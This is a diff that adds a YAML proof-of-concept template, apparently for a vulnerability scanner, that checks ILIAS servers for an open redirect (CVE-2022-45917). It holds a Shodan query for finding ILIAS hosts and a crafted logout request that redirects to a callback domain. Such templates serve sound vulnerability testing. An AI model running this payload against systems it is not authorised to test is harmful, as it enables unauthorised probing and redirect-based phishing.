@@ -1,0 +1,21 @@
+id: poc-yaml-ilias-open-redirect
+info:
+  name: Ilias 任意重定向漏洞(CVE-2022-45917)
+  severity: medium
+  tags:
+  - CVE-2022-45917
+  - 任意重定向
+  finger: ilias
+  shodan: http.html:"ILIAS"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /shib_logout.php?action=logout&return=https://{{.domain}}
+  expression: 'status_code == 302
+
+    && contains(headers,"Location: https://" + domain)
+
+    '
+transport: http
